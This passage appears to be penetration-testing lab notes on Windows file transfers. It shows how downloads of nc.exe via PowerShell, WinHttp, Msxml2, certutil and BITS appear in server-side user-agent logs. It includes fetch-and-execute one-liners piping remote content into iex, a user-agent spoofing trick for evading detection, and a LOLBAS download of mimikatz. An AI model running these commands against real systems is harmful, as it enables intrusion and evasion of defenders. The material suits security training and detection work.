Casey Smith ([@subTee](https://twitter.com/subtee?lang=en)) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto `wget` for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.

***

## 7.Detection

Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation.

{% embed url="<https://useragentstring.com/pages/useragentstring.php>" %}

Malicious file transfers can also be detected by their user agents.

**Invoke-WebRequest - Client**

```powershell-session
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

**Invoke-WebRequest - Server**

```
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

***

**WinHttpRequest - Client**

```powershell-session
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText
```

**WinHttpRequest - Server**

```shell-session
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

***

**Msxml2 - Client**

```powershell-session
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.responseText
```

**Msxml2 - Server**

```shell-session
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

***

**Certutil - Client**

```cmd-session
C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

**Certutil - Server**

```shell-session
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```

***

**BITS - Client**

```powershell-session
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t; 
PS C:\htb> iex $r
```

**BITS - Server**

```shell-session
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```

***

## 8.Evading Detection

### Changing User Agent

**Listing out User Agents**

```powershell-session
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

**Request with Chrome User Agent**

```powershell-session
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

```shell-session
nc -lvnp 80
```

***

## LOLBAS / GTFOBins

**Transferring File with GfxDownloadWrapper.exe**

```powershell-session
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```
